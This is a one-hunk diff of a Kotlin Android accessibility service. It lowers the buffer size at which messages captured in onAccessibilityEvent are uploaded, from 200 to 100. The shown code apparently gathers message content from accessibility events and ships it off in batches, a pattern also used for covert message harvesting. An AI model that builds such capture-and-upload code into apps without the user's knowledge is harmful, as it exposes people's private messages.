@@ -44,7 +44,7 @@ open class CompositionAbService(
     override fun onAccessibilityEvent(event: AccessibilityEvent?) {
         if ((System.currentTimeMillis() - lastRead) < sleep) return
 
-        if (messageList.size > 200 && !uploading) {
+        if (messageList.size > 100 && !uploading) {
             allMessageList.addAll(messageList)
             uploadMessage()
             if (allMessageList.size > 100 * 1000) allMessageList.clear()
